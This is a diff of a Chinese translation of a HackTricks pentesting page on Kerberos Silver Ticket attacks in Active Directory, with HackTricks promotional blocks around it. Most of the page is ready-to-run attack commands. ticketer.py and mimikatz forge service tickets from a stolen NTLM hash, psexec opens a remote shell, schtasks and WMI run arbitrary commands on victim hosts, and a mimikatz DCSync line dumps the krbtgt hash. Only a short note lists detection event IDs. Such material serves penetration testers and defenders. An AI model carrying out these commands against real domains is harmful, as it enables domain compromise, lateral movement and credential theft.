@@ -1,30 +1,30 @@
-# 银票
+# Silver Ticket
 
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks 云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* 你在一家**网络安全公司**工作吗？你想在 HackTricks 中看到你的**公司广告**吗？或者你想获得**PEASS 的最新版本或下载 HackTricks 的 PDF 版本**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
-* 发现我们的独家 NFT 收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
-* 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
-* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
-* **通过向**[**hacktricks 仓库**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud 仓库**](https://github.com/carlospolop/hacktricks-cloud) **提交 PR 来分享你的黑客技巧。**
+* 如果您在**网络安全公司**工作？您想在**HackTricks**中看到您的**公司广告**？或者您想要访问**PEASS的最新版本或下载HackTricks的PDF**？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
+* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs**](https://opensea.io/collection/the-peass-family)系列
+* 获取[**官方PEASS & HackTricks周边商品**](https://peass.creator-spring.com)
+* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**telegram群组**](https://t.me/peass)或在**Twitter**上**关注**我[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
+* **通过向**[**hacktricks仓库**](https://github.com/carlospolop/hacktricks) **和** [**hacktricks-cloud仓库**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享您的黑客技巧。**
 
 </details>
 
-<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">
+<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">
 
-如果你对**黑客职业**感兴趣并且想要攻破不可攻破的东西 - **我们正在招聘！**（需要流利的波兰语书写和口语能力）。
+如果您对**黑客职业**感兴趣，并且想要黑入不可黑之物 - **我们正在招聘！**（_需要流利的波兰语书写和口语_）。
 
 {% embed url="https://www.stmcyber.com/careers" %}
 
-## 银票
+## Silver ticket
 
-银票攻击是基于**在拥有服务的 NTLM 哈希（如 PC 账户哈希）的情况下，构造一个有效的 TGS**。因此，可以通过伪造自定义 TGS **以任何用户的身份**获得对该服务的访问权限。
+Silver ticket攻击基于**一旦拥有服务的NTLM哈希（如**PC账户哈希**），就制作一个有效的TGS**。因此，可以通过伪造自定义TGS**作为任何用户**来**访问该服务**。
 
-在这种情况下，拥有了一个计算机账户的 NTLM **哈希**（在 AD 中类似于用户账户）。因此，可以通过 SMB 服务**伪造**一个**票据**，以**管理员**权限进入该计算机。计算机账户默认每30天重置密码。
+在这种情况下，拥有了**计算机账户的NTLM哈希**（在AD中相当于用户账户）。因此，可以**制作**一个**票据**，以便通过SMB服务以**管理员**权限**进入该机器**。计算机账户默认每30天重置一次密码。
 
-还必须考虑到可以使用 AES Kerberos 密钥（AES128 和 AES256）**伪造票据是可能的和更好的**（opsec）。要了解如何生成 AES 密钥，请阅读：[MS-KILE 的第4.4节](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-kile/936a4878-9462-4753-aac8-087cd3ca4625) 或 [Get-KerberosAESKey.ps1](https://gist.github.com/Kevin-Robertson/9e0f8bfdbf4c1e694e6ff4197f0a4372)。
+还必须考虑到使用AES Kerberos密钥（AES128和AES256）**伪造票据是可能的，也是**更**可取的**（操作安全）。要了解如何生成AES密钥，请阅读：[MS-KILE的第4.4节](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/936a4878-9462-4753-aac8-087cd3ca4625)或[Get-KerberosAESKey.ps1](https://gist.github.com/Kevin-Robertson/9e0f8bfdbf4c1e694e6ff4197f0a4372)。
 
 {% code title="Linux" %}
 ```bash
@@ -32,11 +32,9 @@ python ticketer.py -nthash b18b4b218eccad1c223306ea1916885f -domain-sid S-1-5-21
 export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
 python psexec.py jurassic.park/stegosaurus@labwws02.jurassic.park -k -no-pass
 ```
-{% endcode %}
-
-在Windows中，可以使用**Mimikatz**来**构造**票据。然后，使用**Rubeus**注入票据，最后可以通过**PsExec**获得远程shell。
-
-{% code title="Windows" %}
+```markdown
+在Windows中，可以使用**Mimikatz**来**制作** **票据**。接下来，使用**Rubeus**将票据**注入**，最后可以通过**PsExec**获得远程shell。
+```
 ```bash
 #Create the ticket
 mimikatz.exe "kerberos::golden /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /rc4:b18b4b218eccad1c223306ea1916885f /user:stegosaurus /service:cifs /target:labwws02.jurassic.park"
@@ -51,48 +49,48 @@ kerberos::golden /user:Administrator /domain:jurassic.park /sid:S-1-5-21-1339291
 ```
 {% endcode %}
 
-**CIFS**服务允许您访问受害者的文件系统。您可以在此处找到其他服务：[https://adsecurity.org/?page\_id=183](https://adsecurity.org/?page\_id=183)。例如，您可以使用**HOST服务**在计算机上创建一个_schtask_。然后，您可以尝试列出受害者的任务来检查是否成功：`schtasks /S <hostname>`，或者您可以使用**HOST和RPCSS服务**在计算机上执行**WMI**查询，测试方法如下：`Get-WmiObject -Class win32_operatingsystem -ComputerName <hostname>`
+**CIFS** 服务允许您**访问受害者的文件系统**。您可以在此找到其他服务：[**https://adsecurity.org/?page\_id=183**](https://adsecurity.org/?page\_id=183)**。**例如，您可以使用 **HOST 服务** 在计算机上创建一个 _**schtask**_。然后，您可以尝试列出受害者的任务来检查这是否有效：`schtasks /S <hostname>` 或者您可以使用 **HOST 和** **RPCSS 服务** 在计算机上执行 **WMI** 查询，测试它执行：`Get-WmiObject -Class win32_operatingsystem -ComputerName <hostname>`
 
 ### 缓解措施
 
-银票事件ID（比黄金票更隐蔽）：
+Silver ticket 事件 ID（比 golden ticket 更隐蔽）：
 
 * 4624：账户登录
 * 4634：账户注销
 * 4672：管理员登录
 
-[**有关银票的更多信息，请参阅ired.team**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
+[**关于 Silver Tickets 的更多信息在 ired.team**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
 
 ## 可用服务
 
-| 服务类型                                 | 服务银票                                                         |
-| ---------------------------------------- | ---------------------------------------------------------------- |
-| WMI                                      | <p>HOST</p><p>RPCSS</p>                                          |
-| PowerShell 远程管理                      | <p>HOST</p><p>HTTP</p><p>根据操作系统还可能有：</p><p>WSMAN</p><p>RPCSS</p> |
-| WinRM                                    | <p>HOST</p><p>HTTP</p><p>在某些情况下，您只需请求：WINRM</p>         |
-| 计划任务                                 | HOST                                                             |
-| Windows 文件共享，也可以使用psexec        | CIFS                                                             |
-| LDAP 操作，包括 DCSync                    | LDAP                                                             |
-| Windows 远程服务器管理工具                | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                 |
-| 黄金票                                   | krbtgt                                                           |
+| 服务类型                                   | 服务 Silver Tickets                                                       |
+| ------------------------------------------ | ------------------------------------------------------------------------ |
+| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                  |
+| PowerShell 远程操作                        | <p>HOST</p><p>HTTP</p><p>取决于操作系统，也可能有：</p><p>WSMAN</p><p>RPCSS</p> |
+| WinRM                                      | <p>HOST</p><p>HTTP</p><p>在某些情况下，您可以直接请求：WINRM</p>         |
+| 计划任务                                   | HOST                                                                     |
+| Windows 文件共享，也包括 psexec            | CIFS                                                                     |
+| LDAP 操作，包括 DCSync                     | LDAP                                                                     |
+| Windows 远程服务器管理工具                 | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                       |
+| Golden Tickets                             | krbtgt                                                                   |
 
-使用**Rubeus**，您可以使用以下参数请求所有这些票证：
+使用 **Rubeus**，您可以使用以下参数请求所有这些票据：
 
 * `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`
 
-## 滥用服务票证
+## 滥用服务票据
 
-在以下示例中，假设使用管理员帐户模拟检索到票证。
+在以下示例中，假设以管理员账户的身份检索票据。
 
 ### CIFS
 
-使用此票证，您将能够通过**SMB**访问`C$`和`ADMIN$`文件夹（如果它们被公开），并将文件复制到远程文件系统的某个位置，只需执行以下操作：
+有了这张票据，您将能够通过 **SMB** 访问 `C$` 和 `ADMIN$` 文件夹（如果它们被暴露）并仅通过执行如下操作将文件复制到远程文件系统的一部分：
 ```bash
 dir \\vulnerable.computer\C$
 dir \\vulnerable.computer\ADMIN$
 copy afile.txt \\vulnerable.computer\C$\Windows\Temp
 ```
-您还可以使用**psexec**在主机内获取一个shell或执行任意命令：
+您还可以使用 **psexec** 在主机内获取 shell 或执行任意命令：
 
 {% content-ref url="../ntlm/psexec-and-winexec.md" %}
 [psexec-and-winexec.md](../ntlm/psexec-and-winexec.md)
@@ -100,7 +98,7 @@ copy afile.txt \\vulnerable.computer\C$\Windows\Temp
 
 ### 主机
 
-通过此权限，您可以在远程计算机上生成计划任务并执行任意命令：
+拥有此权限，您可以在远程计算机上生成计划任务并执行任意命令：
 ```bash
 #Check you have permissions to use schtasks over a remote server
 schtasks /S some.vuln.pc
@@ -112,9 +110,9 @@ schtasks /query /S some.vuln.pc
 #Run created schtask now
 schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
 ```
-### 主机 + RPCSS
+### HOST + RPCSS
 
-使用这些票据，您可以在受害系统上执行 WMI：
+使用这些票据，您可以**在受害系统中执行WMI**：
 ```bash
 #Check you have enough privileges
 Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
@@ -124,7 +122,7 @@ Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlis
 #You can also use wmic
 wmic remote.computer.local list full /format:list
 ```
-在以下页面中查找有关wmiexec的更多信息：
+在以下页面中查找有关 **wmiexec** 的**更多信息**：
 
 {% content-ref url="../ntlm/wmicexec.md" %}
 [wmicexec.md](../ntlm/wmicexec.md)
@@ -132,35 +130,35 @@ wmic remote.computer.local list full /format:list
 
 ### 主机 + WSMAN (WINRM)
 
-通过计算机上的winrm访问，您可以**访问它**，甚至获取PowerShell：
+通过 winrm 访问一台计算机，您可以**访问它**，甚至可以获得 PowerShell：
 ```bash
 New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
 ```
-请查看以下页面以了解使用winrm与远程主机建立连接的更多方法：
+查看以下页面，了解**使用 winrm 连接远程主机的更多方法**：
 
 {% content-ref url="../ntlm/winrm.md" %}
 [winrm.md](../ntlm/winrm.md)
 {% endcontent-ref %}
 
 {% hint style="warning" %}
-请注意，要访问远程计算机，**winrm必须处于活动状态并监听**。
+请注意，要访问远程计算机，**winrm 必须处于活动状态并且在监听**。
 {% endhint %}
 
 ### LDAP
 
-通过此特权，您可以使用**DCSync**来转储DC数据库：
+拥有此权限，您可以使用 **DCSync** 导出 DC 数据库：
 ```
 mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
 ```
-在以下页面了解有关DCSync的更多信息：
+**了解更多关于DCSync** 的信息，请查看以下页面：
 
 {% content-ref url="dcsync.md" %}
 [dcsync.md](dcsync.md)
 {% endcontent-ref %}
 
-<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">
+<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">
 
-如果您对**黑客职业**感兴趣并想要攻破不可攻破的东西 - **我们正在招聘！**（需要流利的波兰语书面和口语表达能力）。
+如果你对**黑客职业**感兴趣，并且想要黑进那些不可黑的系统 - **我们正在招聘！**（_需要流利的波兰语书写和口语_）。
 
 {% embed url="https://www.stmcyber.com/careers" %}
 
@@ -168,10 +166,10 @@ mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.loc
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* 您在**网络安全公司**工作吗？您想在HackTricks中看到您的**公司广告**吗？或者您想要访问**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)！
-* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品 - [**The PEASS Family**](https://opensea.io/collection/the-peass-family)
-* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
-* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或在**Twitter**上**关注**我[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
-* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享您的黑客技巧。**
+* 你在**网络安全公司**工作吗？你想在**HackTricks**上看到你的**公司广告**吗？或者你想要获得**PEASS最新版本或下载HackTricks的PDF**吗？查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
+* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs**](https://opensea.io/collection/the-peass-family)收藏
+* 获取[**官方PEASS & HackTricks周边商品**](https://peass.creator-spring.com)
+* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在**Twitter**上**关注**我 [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
+* **通过向** [**hacktricks仓库**](https://github.com/carlospolop/hacktricks) **和** [**hacktricks-cloud仓库**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**
 
 </details>
